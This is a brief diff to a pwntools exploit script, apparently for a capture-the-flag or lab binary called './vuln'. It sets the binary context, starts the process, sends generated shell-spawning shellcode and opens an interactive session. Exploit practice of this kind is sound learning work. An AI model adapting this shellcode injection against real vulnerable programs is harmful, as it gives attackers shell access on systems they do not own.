@@ -1,5 +1,7 @@
 from pwn import *
 
-p = process("./vuln")
+context.binary = "./vuln"
+
+p = process()
 p.sendline(asm(shellcraft.sh()))
 p.interactive()
